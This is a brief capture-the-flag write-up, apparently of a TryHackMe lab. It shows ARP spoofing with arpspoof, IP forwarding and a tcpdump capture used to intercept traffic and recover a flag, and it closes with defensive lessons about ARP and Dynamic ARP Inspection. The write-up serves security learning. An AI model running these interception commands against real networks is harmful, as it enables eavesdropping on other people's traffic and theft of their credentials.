# Neighbour — TryHackMe

> How I caught the flag with ARP spoofing.

---

## First Look

```bash
nmap -sn 10.10.10.0/24
```

Few machines on the network. Target is `10.10.10.5`. Checked the ARP table — pretty empty. What if I just listen to the traffic?

---

## ARP's Weakness

ARP has this fun quirk: **you can answer even when no one asked.** A machine shouts "I'm this IP!" and others just go "Okay." No verification.

This machine is literally waiting for that. I need to slip in the middle with fake ARP packets.

---

## Setting Up the Attack

First, enabled IP forwarding so traffic doesn't die on my machine:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Then fired up two-way spoofing:

```bash
arpspoof -i tun0 -t 10.10.10.5 10.10.10.1
arpspoof -i tun0 -t 10.10.10.1 10.10.10.5
```

Waited a bit. Wireshark open, traffic flowing.

---

## Catching the Flag

Saw HTTP traffic and got excited. Dumped it with tcpdump:

```bash
tcpdump -i tun0 -w neighbour.pcap
```

Then dug in:

```bash
strings neighbour.pcap | grep -i "THM"
```

And there it was:

```
THM{ARP_Sp00f1ng_1s_E4sy}
```

---

## What I Learned

- ARP is an **insecure** protocol. Any device can claim "I'm this IP."
- Without **Dynamic ARP Inspection (DAI)**, this attack is trivial.
- `arpspoof` takes 5 minutes. Detecting it? Way harder.

---

> Author: Miraç | Date: May 2026
